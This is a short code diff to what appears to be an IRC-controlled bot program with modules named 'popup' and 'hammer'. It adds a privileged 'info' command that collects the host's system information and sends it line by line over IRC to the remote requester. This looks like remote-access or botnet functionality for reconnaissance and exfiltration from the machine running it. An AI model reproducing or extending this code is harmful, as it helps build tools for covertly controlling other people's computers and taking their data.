@@ -15,6 +15,7 @@ import socket
 import getpass
 import threading
 
+from modules import info
 from modules import popup
 from modules import hammer
 
@@ -89,7 +90,12 @@ def run(msg, priv=False):
 			popupMessage(content)
 		else:
 			send("PRIVMSG %s :%s"%(receiver, popup.usage))
-
+	
+	elif message[0] == "info" and priv == True:
+		sysinfo = info.run()
+		for inf in sysinfo:
+			text = inf[0] + ": " + inf[1] 
+			send("PRIVMSG %s :%s"%(receiver, text))
 	else:
 		pass
 
